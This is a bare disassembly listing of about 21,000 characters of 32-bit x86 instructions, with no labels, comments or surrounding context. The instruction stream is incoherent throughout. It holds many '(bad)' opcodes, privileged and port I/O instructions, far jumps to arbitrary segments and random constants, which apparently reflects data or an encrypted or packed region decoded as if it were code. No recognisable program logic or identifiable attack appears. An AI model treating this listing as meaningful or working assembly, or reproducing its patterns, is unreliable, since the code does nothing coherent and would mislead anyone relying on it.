  41c8ab:	push   ss
  41c8ac:	and    BYTE PTR [esi+ebp*4],dl
  41c8af:	pop    esi
  41c8b0:	jp     0x41c853
  41c8b2:	popa   
  41c8b3:	int    0x7
  41c8b5:	jo     0x41c911
  41c8b7:	pop    edx
  41c8b8:	cmp    esp,DWORD PTR [edi+0x5ac2913b]
  41c8be:	fs hlt 
  41c8c0:	or     bh,BYTE PTR [edi-0x3cc2b801]
  41c8c6:	hlt    
  41c8c7:	xchg   edi,eax
  41c8c8:	mov    ecx,DWORD PTR [edi+0x41351c5c]
  41c8ce:	retf   0xa9d
  41c8d1:	leave  
  41c8d2:	cmp    dh,dh
  41c8d4:	mov    edi,0x39c8dd10
  41c8d9:	mov    dh,0x56
  41c8db:	test   DWORD PTR [esi],esp
  41c8dd:	scas   al,BYTE PTR es:[edi]
  41c8de:	push   eax
  41c8df:	into   
  41c8e0:	jns    0x41c90a
  41c8e2:	and    al,0xfa
  41c8e4:	add    bl,dh
  41c8e6:	add    eax,0xc46368c
  41c8eb:	add    al,0x2d
  41c8ed:	data16 sbb bl,BYTE PTR [ebx]
  41c8f0:	jnp    0x41c89f
  41c8f2:	jl     0x41c878
  41c8f4:	push   0x43f995b5
  41c8f9:	adc    al,0x5b
  41c8fb:	push   0xffffffbc
  41c8fd:	sbb    BYTE PTR [eax],0xf1
  41c900:	adc    ebx,0x2a
  41c903:	pop    ebp
  41c904:	pop    edi
  41c905:	std    
  41c906:	adc    al,0x5d
  41c908:	int3   
  41c909:	inc    esi
  41c90a:	out    0x6f,al
  41c90c:	pop    ss
  41c90d:	test   DWORD PTR [edi],ebp
  41c90f:	(bad)  
  41c910:	cmp    BYTE PTR [edx],dl
  41c912:	push   ds
  41c913:	xor    ch,BYTE PTR [ecx]
  41c915:	dec    edi
  41c916:	cwde   
  41c917:	dec    ebp
  41c918:	pop    esp
  41c919:	mov    bh,0x83
  41c91b:	adc    DWORD PTR [edx],0x155d59e1
  41c921:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c922:	sub    BYTE PTR [ecx+0xe],cl
  41c925:	jmp    0x41c958
  41c927:	pop    ss
  41c928:	adc    dh,0xad
  41c92b:	sbb    bh,BYTE PTR [edi+0x44]
  41c92e:	pop    ds
  41c92f:	jl     0x41c9ae
  41c931:	xchg   esi,eax
  41c932:	add    eax,0x3d422239
  41c937:	stos   BYTE PTR es:[edi],al
  41c938:	fisttp QWORD PTR [edx+esi*2-0x70]
  41c93c:	ins    DWORD PTR es:[edi],dx
  41c93d:	sar    BYTE PTR [esp+edx*2],1
  41c940:	fldpi  
  41c942:	pop    edx
  41c943:	pop    edx
  41c944:	sub    al,0x8e
  41c946:	scas   al,BYTE PTR es:[edi]
  41c947:	sub    bl,al
  41c949:	pop    ss
  41c94a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c94b:	sbb    DWORD PTR [ecx],ebx
  41c94d:	sti    
  41c94e:	add    eax,0xb8b85179
  41c953:	mov    edi,0xf5e5d152
  41c958:	popa   
  41c959:	jp     0x41c99c
  41c95b:	jle    0x41c940
  41c95d:	xor    DWORD PTR [esi],edx
  41c95f:	mov    DWORD PTR [edx],ecx
  41c961:	dec    edx
  41c962:	fiadd  DWORD PTR [edi-0x2ad30b70]
  41c968:	pop    ebp
  41c969:	pop    esp
  41c96a:	hlt    
  41c96b:	inc    edx
  41c96c:	xchg   edi,eax
  41c96d:	pop    ecx
  41c96e:	repnz push cs
  41c970:	sbb    esi,DWORD PTR [esi]
  41c972:	outs   dx,DWORD PTR ss:[esi]
  41c974:	fst    QWORD PTR [ebx]
  41c976:	adc    DWORD PTR [ebx+0x17],ebx
  41c979:	mov    BYTE PTR [edi-0x7d],cl
  41c97c:	sub    eax,0x38274fa0
  41c981:	add    eax,DWORD PTR [ebx-0x34734759]
  41c987:	je     0x41c98d
  41c989:	std    
  41c98a:	sbb    BYTE PTR [ecx+0x0],bl
  41c98d:	mov    edi,DWORD PTR [eax]
  41c98f:	test   al,0x3e
  41c991:	jecxz  0x41c9d5
  41c993:	pushf  
  41c994:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c995:	(bad)  
  41c996:	stos   BYTE PTR es:[edi],al
  41c997:	sub    BYTE PTR es:[ebp-0x3a],bh
  41c99b:	daa    
  41c99c:	pop    ss
  41c99d:	xchg   sp,ax
  41c99f:	ror    BYTE PTR [eax-0x521b193f],cl
  41c9a5:	dec    eax
  41c9a6:	mov    esp,0x60165df9
  41c9ab:	jb     0x41c9af
  41c9ad:	lahf   
  41c9ae:	loope  0x41c9b3
  41c9b0:	ins    DWORD PTR es:[edi],dx
  41c9b1:	xor    al,BYTE PTR [edi+edx*4-0x75c06828]
  41c9b8:	loopne 0x41c9ce
  41c9ba:	stc    
  41c9bb:	cli    
  41c9bc:	imul   esp,DWORD PTR [ecx],0x24
  41c9bf:	lahf   
  41c9c0:	hlt    
  41c9c1:	mov    ebx,0x811d6719
  41c9c6:	fsubr  st(0),st
  41c9c8:	push   esp
  41c9c9:	cwde   
  41c9ca:	lds    eax,FWORD PTR [ebx+0x3f]
  41c9cd:	in     al,0xec
  41c9cf:	xchg   esp,eax
  41c9d0:	pop    ecx
  41c9d1:	adc    eax,0x5de28dfd
  41c9d6:	shl    DWORD PTR [eax],0xe2
  41c9d9:	xchg   ebx,eax
  41c9da:	sti    
  41c9db:	repnz xor edi,0xcbb68493
  41c9e2:	pop    eax
  41c9e3:	push   es
  41c9e4:	mov    bh,0x7d
  41c9e6:	push   eax
  41c9e7:	(bad)  
  41c9e8:	das    
  41c9e9:	mov    cl,BYTE PTR [edx+esi*4]
  41c9ec:	and    al,0xee
  41c9ee:	mov    ebp,0x7e588e9b
  41c9f3:	jae    0x41c9fe
  41c9f5:	pop    ebx
  41c9f6:	push   edi
  41c9f7:	(bad)  
  41c9f8:	enter  0xbdb7,0x9
  41c9fc:	in     al,dx
  41c9fd:	xlat   BYTE PTR ds:[ebx]
  41c9fe:	and    BYTE PTR [esi],dl
  41ca00:	cmp    DWORD PTR [eax],edx
  41ca02:	je     0x41c9d9
  41ca04:	or     DWORD PTR [esi+esi*8+0x28],eax
  41ca08:	cmc    
  41ca09:	addr16 add edi,ecx
  41ca0c:	jecxz  0x41c98e
  41ca0e:	cdq    
  41ca0f:	pushf  
  41ca10:	or     eax,0xc7fc4eb1
  41ca15:	ja     0x41c9ab
  41ca17:	sbb    DWORD PTR [edx-0x7e0de219],ebx
  41ca1d:	jmp    0x41ca48
  41ca1f:	mov    ah,0x4d
  41ca21:	clc    
  41ca22:	xor    BYTE PTR [edx],0x75
  41ca25:	stc    
  41ca26:	test   eax,0x4d46e242
  41ca2b:	or     DWORD PTR [edi+0x13],eax
  41ca2e:	sub    ah,BYTE PTR [edx+0x41]
  41ca31:	xor    bh,bh
  41ca33:	loop   0x41ca52
  41ca35:	not    cl
  41ca37:	das    
  41ca38:	outs   dx,DWORD PTR ds:[esi]
  41ca39:	pop    ecx
  41ca3a:	sub    BYTE PTR [edi-0x5951cf25],dh
  41ca40:	mov    edx,0x41cf71d9
  41ca45:	loop   0x41ca97
  41ca47:	retf   
  41ca48:	push   ecx
  41ca49:	push   cs
  41ca4a:	push   edi
  41ca4b:	mov    eax,ds:0x174b0c26
  41ca50:	(bad)  
  41ca51:	fild   WORD PTR [ecx+0x14]
  41ca54:	gs mov edx,0x892c2b8c
  41ca5a:	bound  eax,QWORD PTR [ecx]
  41ca5c:	popf   
  41ca5d:	adc    al,0x9f
  41ca5f:	adc    esi,0x4c
  41ca62:	jmp    0x41ca41
  41ca64:	add    esp,esi
  41ca66:	pushf  
  41ca67:	sti    
  41ca68:	pop    ecx
  41ca69:	test   al,0x8b
  41ca6b:	cmc    
  41ca6c:	push   es
  41ca6d:	retf   0xe65
  41ca70:	xchg   ebp,eax
  41ca71:	arpl   WORD PTR [edi+0x61656e35],bp
  41ca77:	sub    BYTE PTR [ecx],al
  41ca79:	sub    DWORD PTR [esi+0x22],0x2caec7fc
  41ca80:	cmc    
  41ca81:	out    dx,eax
  41ca82:	xor    al,0x98
  41ca84:	ret    0xfdd
  41ca87:	cmp    dl,0x15
  41ca8a:	fsub   QWORD PTR [ebx]
  41ca8c:	mov    eax,0xcb6498b9
  41ca91:	lods   al,BYTE PTR ds:[esi]
  41ca92:	add    BYTE PTR [ebp-0x1a5a36d],ah
  41ca98:	stc    
  41ca99:	push   es
  41ca9a:	pop    ecx
  41ca9b:	ds xor DWORD PTR gs:[ebx],edi
  41ca9f:	lahf   
  41caa0:	pop    esp
  41caa1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41caa2:	and    dl,bh
  41caa4:	mov    esi,0xab637eed
  41caa9:	mov    edi,0x8006e28b
  41caae:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41caaf:	inc    esi
  41cab0:	mov    dl,0x90
  41cab2:	mov    edx,edx
  41cab4:	sbb    ebx,esi
  41cab6:	fst    QWORD PTR [ebp-0x5a]
  41cab9:	sub    eax,0x9d70fe42
  41cabe:	retf   0x234c
  41cac1:	repz or eax,0xf9b6ca5c
  41cac7:	jmp    DWORD PTR [eax-0xc]
  41caca:	and    al,0x37
  41cacc:	dec    esp
  41cacd:	inc    ebp
  41cace:	xchg   edi,eax
  41cacf:	mov    ds:0x166456d0,al
  41cad4:	scas   eax,DWORD PTR es:[edi]
  41cad5:	xchg   ecx,eax
  41cad6:	sub    al,0xe5
  41cad8:	push   ebx
  41cad9:	dec    esi
  41cada:	adc    bh,BYTE PTR [ebx+0xd4e5887]
  41cae0:	mov    WORD PTR [esi+0x32],cs
  41cae3:	mov    BYTE PTR [edx+0x4e],ah
  41cae6:	or     al,0x43
  41cae8:	push   ebp
  41cae9:	mov    esi,0x6e1f0bc1
  41caee:	add    BYTE PTR [edx+0x26df96ea],cl
  41caf4:	push   edx
  41caf5:	dec    edi
  41caf6:	mov    dl,0x9a
  41caf8:	dec    edi
  41caf9:	xor    al,0x30
  41cafb:	fs out dx,eax
  41cafd:	daa    
  41cafe:	iret   
  41caff:	clc    
  41cb00:	mov    al,ds:0x5d94201
  41cb05:	int    0xc5
  41cb07:	push   ds
  41cb08:	test   eax,0x23f40f5a
  41cb0d:	inc    esp
  41cb0e:	inc    eax
  41cb0f:	jae    0x41cb8e
  41cb11:	stc    
  41cb12:	xchg   DWORD PTR [edi+0x1697aadf],eax
  41cb18:	repz xchg esi,eax
  41cb1a:	fwait
  41cb1b:	lods   al,BYTE PTR ds:[esi]
  41cb1c:	test   al,0x85
  41cb1e:	pop    edi
  41cb1f:	sbb    eax,0xe965e1ef
  41cb24:	xchg   BYTE PTR [ecx-0x58],bh
  41cb27:	popf   
  41cb28:	adc    BYTE PTR [edi-0x34efdc47],ah
  41cb2e:	lds    ebx,FWORD PTR [ecx-0x38]
  41cb31:	repz loope 0x41cafe
  41cb34:	mov    ah,0x9b
  41cb36:	test   al,0xb9
  41cb38:	das    
  41cb39:	nop
  41cb3a:	mov    eax,ds:0x54a6c694
  41cb3f:	pop    eax
  41cb40:	pusha  
  41cb41:	in     eax,dx
  41cb42:	sub    dl,dh
  41cb44:	mov    ah,0x7d
  41cb46:	stos   DWORD PTR es:[edi],eax
  41cb47:	repnz es add eax,0x5a26b691
  41cb4e:	mov    ebx,0x31632920
  41cb53:	imul   ecx,DWORD PTR [edx-0x75],0x963ac1dc
  41cb5a:	es ja  0x41caea
  41cb5d:	bound  edi,QWORD PTR [edx]
  41cb5f:	addr16 cmp dh,al
  41cb62:	int3   
  41cb63:	inc    esp
  41cb64:	call   0x39db548c
  41cb69:	(bad)  
  41cb6a:	cmp    DWORD PTR [ebp+edx*1-0x34],esp
  41cb6e:	inc    edi
  41cb6f:	jle    0x41cb74
  41cb71:	jb     0x41cb22
  41cb73:	in     al,0x9c
  41cb75:	call   0xebc:0xb16d1176
  41cb7c:	out    0x3b,al
  41cb7e:	popf   
  41cb7f:	and    al,0xb6
  41cb81:	retf   
  41cb82:	jg     0x41cb46
  41cb84:	pop    ebx
  41cb85:	jmp    0x7a12f05f
  41cb8a:	mov    edi,0x1ff8ab6a
  41cb8f:	pop    edi
  41cb90:	sub    eax,DWORD PTR [eax-0x4]
  41cb93:	dec    eax
  41cb94:	ret    
  41cb95:	ret    
  41cb96:	mov    ah,0x10
  41cb98:	xchg   ebx,eax
  41cb99:	aad    0x8f
  41cb9b:	mov    esi,ebx
  41cb9d:	pusha  
  41cb9e:	add    eax,0xa9535982
  41cba3:	dec    edx
  41cba4:	es js  0x41cbcb
  41cba7:	sub    ecx,DWORD PTR [eax-0x3]
  41cbaa:	and    ebp,ecx
  41cbac:	nop
  41cbad:	and    eax,0x806fab02
  41cbb2:	mov    BYTE PTR [ebp+0x2a],ch
  41cbb5:	ins    BYTE PTR es:[edi],dx
  41cbb6:	test   al,0x6
  41cbb8:	iret   
  41cbb9:	je     0x41cc10
  41cbbb:	in     eax,dx
  41cbbc:	xor    ch,BYTE PTR [esi-0x7bc6ad86]
  41cbc2:	xchg   ch,ah
  41cbc4:	and    edi,DWORD PTR [ebp+eiz*2-0x48]
  41cbc8:	sub    DWORD PTR [esi],ebx
  41cbca:	ja     0x41cb6a
  41cbcc:	jno    0x41cb5d
  41cbce:	(bad)  
  41cbcf:	jge    0x41cbe9
  41cbd1:	cmp    DWORD PTR [edi+0x776e20d8],esi
  41cbd7:	fst    QWORD PTR [edx-0x609f35ec]
  41cbdd:	lea    esi,[eax-0x7d]
  41cbe0:	aad    0xf0
  41cbe2:	out    dx,al
  41cbe3:	and    esp,DWORD PTR [ebx+0x259847df]
  41cbe9:	add    BYTE PTR [edx-0x52],dl
  41cbec:	xchg   BYTE PTR [esi+0x4f],al
  41cbef:	(bad)  
  41cbf0:	ss fwait
  41cbf2:	pushf  
  41cbf3:	test   eax,0x3bc1405d
  41cbf8:	into   
  41cbf9:	and    esp,DWORD PTR [ecx+ebp*1-0x13]
  41cbfd:	jl     0x41cc1a
  41cbff:	fcomi  st,st(4)
  41cc01:	push   edx
  41cc02:	test   ah,al
  41cc04:	push   es
  41cc05:	xchg   ecx,eax
  41cc06:	lahf   
  41cc07:	jne    0x41cba8
  41cc09:	sub    edi,DWORD PTR ds:0x8eb4f379
  41cc0f:	cli    
  41cc10:	imul   edi,DWORD PTR fs:[edx-0x3a48b1ff],0x26
  41cc18:	adc    al,bh
  41cc1a:	out    dx,eax
  41cc1b:	push   esp
  41cc1c:	push   0xa
  41cc1e:	or     eax,0x6f969282
  41cc23:	fs pop ebx
  41cc25:	add    al,0x20
  41cc27:	out    0xc3,eax
  41cc29:	inc    ebp
  41cc2a:	xlat   BYTE PTR ds:[ebx]
  41cc2b:	jmp    0x41cc03
  41cc2d:	fidivr DWORD PTR [ebx-0x10]
  41cc30:	or     esp,0x15
  41cc33:	mov    eax,0x21d40183
  41cc38:	lods   al,BYTE PTR ds:[esi]
  41cc39:	std    
  41cc3a:	pop    cx
  41cc3c:	add    DWORD PTR ds:0x639ec4be,esi
  41cc42:	xor    al,0xb3
  41cc44:	xchg   BYTE PTR [ebx],cl
  41cc46:	not    bh
  41cc48:	adc    ah,BYTE PTR [ebx+eax*8-0x69]
  41cc4c:	call   0xcff8962
  41cc51:	out    dx,al
  41cc52:	std    
  41cc53:	repz cmp eax,0x12d50e9c
  41cc59:	jo     0x41cc30
  41cc5b:	push   eax
  41cc5c:	lods   al,BYTE PTR ds:[esi]
  41cc5d:	jo     0x41cc26
  41cc5f:	ficom  DWORD PTR [ebp-0x5acc9efc]
  41cc65:	mov    esi,DWORD PTR [ebp-0x39]
  41cc68:	dec    esi
  41cc69:	xor    cl,BYTE PTR [ecx-0x77]
  41cc6c:	xchg   edi,eax
  41cc6d:	lods   al,BYTE PTR ds:[esi]
  41cc6e:	cmp    al,0x5
  41cc70:	sub    DWORD PTR [ebx],ebp
  41cc72:	pop    es
  41cc73:	pop    ebp
  41cc74:	push   cs
  41cc75:	repz cmp al,0xcb
  41cc78:	retf   
  41cc79:	xlat   BYTE PTR ds:[ebx]
  41cc7a:	push   DWORD PTR [ebp+esi*1+0x5f6d5f29]
  41cc81:	push   0xb132e970
  41cc86:	jnp    0x41cd05
  41cc88:	stc    
  41cc89:	adc    DWORD PTR [edx+0x13],eax
  41cc8c:	or     dh,ch
  41cc8e:	add    DWORD PTR [ecx-0x7c],esp
  41cc91:	push   0xfffffff0
  41cc93:	pop    ss
  41cc94:	push   cs
  41cc95:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41cc96:	inc    esi
  41cc97:	push   0xffffff96
  41cc99:	test   DWORD PTR [esi-0x30f692a],0x5a0fb609
  41cca3:	mov    dh,0x71
  41cca5:	mov    ds:0x6811a46b,al
  41ccaa:	repnz inc ebx
  41ccac:	cmp    al,BYTE PTR [eax+0x509931a3]
  41ccb2:	gs int 0x0
  41ccb5:	and    DWORD PTR [ecx+0x69be835d],esi
  41ccbb:	push   ebp
  41ccbc:	jecxz  0x41ccc3
  41ccbe:	push   0xfece6caa
  41ccc3:	pop    ecx
  41ccc4:	jae    0x41ccca
  41ccc6:	sti    
  41ccc7:	inc    ebx
  41ccc8:	mov    ch,0xea
  41ccca:	rol    DWORD PTR [esi],1
  41cccc:	ins    DWORD PTR es:[edi],dx
  41cccd:	aam    0x67
  41cccf:	lahf   
  41ccd0:	sbb    al,0xaf
  41ccd2:	and    DWORD PTR [edx+edi*1-0x5e],0x5ea4de71
  41ccda:	mov    edi,0x7c9477e8
  41ccdf:	mov    dh,dh
  41cce1:	(bad)  
  41cce2:	ins    DWORD PTR es:[edi],dx
  41cce3:	outs   dx,BYTE PTR ds:[esi]
  41cce4:	add    DWORD PTR [eax+edx*4-0x37],ebp
  41cce8:	shl    DWORD PTR ds:0x55554fd6,cl
  41ccee:	popf   
  41ccef:	sub    bh,BYTE PTR [ebx+eiz*2]
  41ccf2:	sub    ah,cl
  41ccf4:	xchg   ecx,eax
  41ccf5:	add    DWORD PTR [edx+0x9d22ae8],0xc87bbb57
  41ccff:	cdq    
  41cd00:	mov    eax,ds:0x30e10133
  41cd05:	mov    bl,0x64
  41cd07:	or     eax,0xd7060af8
  41cd0c:	push   ds
  41cd0d:	aad    0x90
  41cd0f:	cli    
  41cd10:	cld    
  41cd11:	add    BYTE PTR [eax],dh
  41cd13:	jnp    0x41ccc0
  41cd15:	dec    ebx
  41cd16:	mov    dl,0xac
  41cd18:	shl    DWORD PTR [edx],cl
  41cd1a:	mov    esp,0xd2be0429
  41cd1f:	fistp  WORD PTR [edi]
  41cd21:	jno    0x41ccae
  41cd23:	push   esp
  41cd24:	rcl    BYTE PTR [ecx+0x39],0x53
  41cd28:	or     eax,DWORD PTR [ecx]
  41cd2a:	cdq    
  41cd2b:	fwait
  41cd2c:	mov    ebx,0x5e7278a1
  41cd31:	cmp    DWORD PTR [ebx+edx*8+0x17bd2479],edi
  41cd38:	cmp    BYTE PTR [edi],0xb0
  41cd3b:	js     0x41cd98
  41cd3d:	(bad)  
  41cd3e:	fs dec ebp
  41cd40:	push   ss
  41cd41:	xchg   esp,eax
  41cd42:	jge    0x41ccd2
  41cd44:	sbb    eax,DWORD PTR [ebp-0x9]
  41cd47:	fwait
  41cd48:	push   0x1092db36
  41cd4d:	push   ebp
  41cd4e:	adc    eax,0xb8607608
  41cd53:	xor    cl,bl
  41cd55:	mov    al,0x7b
  41cd57:	dec    ecx
  41cd58:	and    bl,ah
  41cd5a:	xor    al,0x69
  41cd5c:	or     BYTE PTR [ecx-0x464b84c0],ch
  41cd62:	pop    es
  41cd63:	mov    ebx,0xd28a4538
  41cd68:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41cd69:	xchg   ebx,eax
  41cd6a:	cmp    DWORD PTR [edi-0x34dacf28],edx
  41cd70:	outs   dx,BYTE PTR ds:[esi]
  41cd71:	pop    ecx
  41cd72:	mov    eax,DWORD PTR [ebp+0x77]
  41cd75:	les    edx,FWORD PTR [ebp-0x2e3110fe]
  41cd7b:	mov    bh,0x34
  41cd7d:	mov    esi,gs
  41cd7f:	xchg   esp,eax
  41cd80:	imul   eax,DWORD PTR [edi+ebx*1+0x4e40ab75],0xffffff92
  41cd88:	(bad)  [ecx]
  41cd8a:	xor    al,0xf2
  41cd8c:	mov    al,0x2a
  41cd8e:	popf   
  41cd8f:	nop
  41cd90:	and    al,0x5f
  41cd92:	fs in  eax,0x10
  41cd95:	or     al,0x5
  41cd97:	stc    
  41cd98:	lea    esp,[edi-0x52d729bb]
  41cd9e:	mov    edi,ebx
  41cda0:	call   FWORD PTR [edi-0x64be7f3b]
  41cda6:	inc    ebx
  41cda7:	mov    edx,0x8f0acda9
  41cdac:	add    BYTE PTR [edx+edi*2+0x7961e6c2],dl
  41cdb3:	dec    eax
  41cdb4:	mov    ah,0x5d
  41cdb6:	ins    BYTE PTR es:[edi],dx
  41cdb7:	push   cs
  41cdb8:	sub    eax,0x33341940
  41cdbd:	in     al,0x88
  41cdbf:	fistp  WORD PTR [ecx-0x4601ee1f]
  41cdc5:	(bad)  
  41cdc6:	sbb    cl,al
  41cdc8:	inc    edi
  41cdc9:	push   cs
  41cdca:	mov    bh,0x25
  41cdcc:	(bad)  
  41cdcd:	sub    cl,BYTE PTR [ebx-0x2c7cf00]
  41cdd3:	ins    BYTE PTR es:[edi],dx
  41cdd4:	neg    BYTE PTR [edi-0x61afd424]
  41cdda:	and    eax,0xd1ad172a
  41cddf:	leave  
  41cde0:	inc    ecx
  41cde1:	push   ebp
  41cde2:	add    DWORD PTR [esi+eiz*2],edi
  41cde5:	test   al,0xd
  41cde7:	fiadd  DWORD PTR [edx+eax*2+0x4518e03b]
  41cdee:	add    al,0x60
  41cdf0:	addr16 add al,0x98
  41cdf3:	pop    edi
  41cdf4:	mov    edx,0xf836068c
  41cdf9:	dec    ebx
  41cdfa:	add    al,0x7
  41cdfc:	cmp    BYTE PTR [esp+edi*2+0x30],dh
  41ce00:	cmp    edx,ebx
  41ce02:	iret   
  41ce03:	jge    0x41ce5b
  41ce05:	cwde   
  41ce06:	ror    BYTE PTR [ebp-0x7cf7ded5],0x0
  41ce0d:	push   eax
  41ce0e:	not    DWORD PTR [ebx+0x4466cce8]
  41ce14:	rcr    BYTE PTR [edi-0x74],cl
  41ce17:	or     DWORD PTR [edi-0x77],ebx
  41ce1a:	sti    
  41ce1b:	(bad)  
  41ce1c:	mov    eax,ds:0x95b04d02
  41ce21:	xchg   edx,eax
  41ce22:	jbe    0x41cdad
  41ce24:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ce25:	stc    
  41ce26:	push   ebx
  41ce27:	pushf  
  41ce28:	jnp    0x41ce5a
  41ce2a:	push   ecx
  41ce2b:	mov    ch,0x4a
  41ce2d:	and    DWORD PTR [edi+0x29],ebp
  41ce30:	shr    ebx,1
  41ce32:	mov    ds:0xf20dbb99,al
  41ce37:	out    dx,al
  41ce38:	dec    esp
  41ce39:	dec    ecx
  41ce3a:	dec    esi
  41ce3b:	sar    DWORD PTR [edi],0xcd
  41ce3e:	jae    0x41ce76
  41ce40:	fadd   DWORD PTR [edi-0xe]
  41ce43:	ins    BYTE PTR es:[edi],dx
  41ce44:	repz pop edi
  41ce46:	mov    DWORD PTR [eax-0x370b94ce],ebx
  41ce4c:	mov    ecx,0xb9172d2b
  41ce51:	mov    ah,0x98
  41ce53:	cmp    DWORD PTR [eax],eax
  41ce55:	ins    BYTE PTR es:[edi],dx
  41ce56:	or     DWORD PTR [eax-0x30],ecx
  41ce59:	or     BYTE PTR [esi+ebp*2-0x1a1cf6c],bl
  41ce60:	inc    esi
  41ce61:	inc    eax
  41ce62:	jecxz  0x41ce3a
  41ce64:	inc    esp
  41ce65:	or     BYTE PTR [eax+0x2c],dh
  41ce68:	cmovl  eax,ecx
  41ce6b:	jg     0x41cee4
  41ce6d:	dec    eax
  41ce6e:	call   0x43fd9e25
  41ce73:	mov    dl,0x82
  41ce75:	ins    DWORD PTR es:[edi],dx
  41ce76:	cmp    esi,DWORD PTR [edx-0x28bab6ec]
  41ce7c:	sub    dh,BYTE PTR [eax]
  41ce7e:	pop    ecx
  41ce7f:	push   esi
  41ce80:	jmp    0x41ce78
  41ce82:	stos   BYTE PTR es:[edi],al
  41ce83:	je     0x41cefa
  41ce85:	mov    esp,0xda17f5f9
  41ce8a:	out    dx,eax
  41ce8b:	fsubr  DWORD PTR [ebx]
  41ce8d:	cmp    eax,0x822f8420
  41ce92:	loope  0x41ceec
  41ce94:	jmp    0x454d:0x2f128fac
  41ce9b:	cmp    eax,0x247e0f9c
  41cea0:	xchg   bh,bl
  41cea2:	push   eax
  41cea3:	fwait
  41cea4:	loope  0x41cedf
  41cea6:	sub    DWORD PTR [eax+0xe],eax
  41cea9:	sbb    dl,ch
  41ceab:	push   edx
  41ceac:	seto   BYTE PTR [ebx]
  41ceaf:	test   eax,0x9b5b2935
  41ceb4:	and    BYTE PTR [esi-0xf457f6b],bh
  41ceba:	inc    esp
  41cebb:	jg     0x41ce5d
  41cebd:	jl     0x41ce63
  41cebf:	in     eax,dx
  41cec0:	(bad)  
  41cec1:	sbb    BYTE PTR [edi+eiz*4-0x651276f6],dh
  41cec8:	shl    BYTE PTR [ebx],0x6c
  41cecb:	jae    0x41ce99
  41cecd:	or     BYTE PTR [edx-0x72804de7],ah
  41ced3:	add    esi,edx
  41ced5:	push   ds
  41ced6:	xor    al,0xac
  41ced8:	imul   esi,DWORD PTR [edx+0xa6d2ac1],0xffffffd5
  41cedf:	jp     0x41cf3c
  41cee1:	test   cl,al
  41cee3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41cee4:	push   ebx
  41cee5:	xchg   esi,eax
  41cee6:	mov    edi,0x14c4151e
  41ceeb:	inc    eax
  41ceec:	outs   dx,BYTE PTR ds:[esi]
  41ceed:	jmp    0x7d414b0e
  41cef2:	loop   0x41cee9
  41cef4:	popa   
  41cef5:	test   BYTE PTR [edx-0x75],dh
  41cef8:	lods   al,BYTE PTR ds:[esi]
  41cef9:	and    edx,DWORD PTR [esi]
  41cefb:	int    0x91
  41cefd:	dec    ebp
  41cefe:	scas   eax,DWORD PTR es:[edi]
  41ceff:	popa   
  41cf00:	pop    esp
  41cf01:	das    
  41cf02:	fistp  QWORD PTR [eax]
  41cf04:	clc    
  41cf05:	jp     0x41cf70
  41cf07:	call   0xc6fb:0x3579a11f
  41cf0e:	div    BYTE PTR [esi]
  41cf10:	mov    bh,0x0
  41cf12:	pop    ss
  41cf13:	(bad)  
  41cf14:	sub    esp,ecx
  41cf16:	and    edi,DWORD PTR [ebp-0x680e7c4b]
  41cf1c:	mov    esp,0x7c605bf0
  41cf21:	sub    al,ch
  41cf23:	dec    ebp
  41cf24:	sbb    DWORD PTR [ecx-0x43e57f6c],ecx
  41cf2a:	mov    dl,0x3d
  41cf2c:	cmp    al,0xc2
  41cf2e:	sahf   
  41cf2f:	jmp    0xa4b7:0x482fb608
  41cf36:	jmp    0xc71f:0xc3a8cfbd
  41cf3d:	test   al,0x4b
  41cf3f:	xchg   edx,eax
  41cf40:	rcl    DWORD PTR [ebp+0x4c],cl
  41cf43:	fild   QWORD PTR [edi-0x15]
  41cf46:	or     al,0x7c
  41cf48:	repnz fs mov ah,0x7f
  41cf4c:	adc    ebx,0x1e
  41cf4f:	in     al,dx
  41cf50:	push   0xffffffcc
  41cf52:	or     esp,esp
  41cf54:	popf   
  41cf55:	(bad)  
  41cf56:	int3   
  41cf57:	add    BYTE PTR [edi+eax*4+0xdbbcbbe],0x17
  41cf5f:	or     al,0x4b
  41cf61:	daa    
  41cf62:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41cf63:	mov    al,ds:0x12db06f3
  41cf68:	jo     0x41cfcd
  41cf6a:	pop    eax
  41cf6b:	pop    ds
  41cf6c:	fwait
  41cf6d:	cli    
  41cf6e:	mov    eax,0xd6f2bed9
  41cf73:	pop    ds
  41cf74:	hlt    
  41cf75:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41cf76:	jmp    DWORD PTR [edi]
  41cf78:	test   DWORD PTR [edi-0x1a11faad],0x58b69dfa
  41cf82:	mov    edx,DWORD PTR [ebx]
  41cf84:	jl     0x41cfa6
  41cf86:	lds    edx,FWORD PTR [esi-0x78f7c45c]
  41cf8c:	mov    cl,0x39
  41cf8e:	sub    al,0x67
  41cf90:	arpl   WORD PTR [ebx+0x3d06c16a],di
  41cf96:	mov    dl,0xca
  41cf98:	rcl    DWORD PTR [edi+0xd],1
  41cf9b:	add    DWORD PTR [edx+eax*1-0x3bf473cb],ebx
  41cfa2:	and    eax,0x65ea6497
  41cfa7:	imul   ecx,esp,0x2f
  41cfaa:	fist   WORD PTR ds:[esp+ecx*1+0x380a26fe]
  41cfb2:	in     eax,dx
  41cfb3:	push   esp
  41cfb4:	inc    ebx
  41cfb5:	(bad)  
  41cfb6:	jnp    0x41cf59
  41cfb8:	mov    al,0xbc
  41cfba:	or     BYTE PTR [ecx-0x7e],dh
  41cfbd:	je     0x41d01d
  41cfbf:	and    DWORD PTR [edi+edx*4-0x2b65e968],edx
  41cfc6:	(bad)  
  41cfc7:	rcl    BYTE PTR [ecx+eax*2],0x35
  41cfcb:	xchg   ah,cl
  41cfcd:	(bad)  
  41cfce:	icebp  
  41cfcf:	jne    0x41cffb
  41cfd1:	outs   dx,DWORD PTR ds:[esi]
  41cfd2:	push   ebp
  41cfd3:	jbe    0x41cfca
  41cfd5:	out    0xbd,al
  41cfd7:	ret    
  41cfd8:	lods   al,BYTE PTR ds:[esi]
  41cfd9:	cmp    al,0xd4
  41cfdb:	cmp    esp,DWORD PTR [ecx+0x59d6f28f]
  41cfe1:	sbb    eax,0xa45fb065
